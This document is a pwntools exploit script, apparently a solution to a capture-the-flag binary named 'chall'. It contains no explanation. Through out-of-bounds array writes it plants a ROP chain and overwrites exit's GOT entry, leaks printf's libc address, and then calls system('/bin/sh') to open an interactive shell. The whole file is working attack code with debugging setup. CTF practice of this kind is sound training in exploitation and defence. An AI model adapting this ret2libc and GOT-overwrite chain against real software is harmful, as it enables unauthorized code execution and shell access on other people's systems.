from pwn import *

file = "./chall"
e = ELF(file)
libc = ELF("./libc-2.31.so")
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]

command = '''
b *main+255
b *main+333
'''

#io = gdb.debug(file, command)
io = process(file)
#io = remote(HOST, PORT)

rop_pop_rdi = 0x004013e3
rop_pop_r15 = 0x004013e2

def setvalue(idx, v):
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("value: ", str(v))

io.sendlineafter("size: ", "5")

# Leak GOT addr
setvalue(0, rop_pop_rdi)
setvalue(1, e.got["printf"])
setvalue(2, e.plt["printf"])
setvalue(3, e.sym["_start"])

# Overwrite size
setvalue(4, 0xffffffff)

setvalue(6, e.got["exit"])
setvalue(0, rop_pop_r15)
io.sendlineafter("index: ", str(-1))

libc.address = u64(io.recvn(6)+b"\x00"*2) - libc.sym["printf"]
print(f'{libc.address:x}')

io.sendlineafter("size: ", "5")
setvalue(0, rop_pop_rdi)
setvalue(1, next(libc.search(b"/bin/sh\x00")))
setvalue(2, libc.sym["system"])

setvalue(4, 0xffffffff)

setvalue(6, e.got["exit"])
setvalue(0, rop_pop_r15)
io.sendlineafter("index: ", str(-1))

io.interactive()
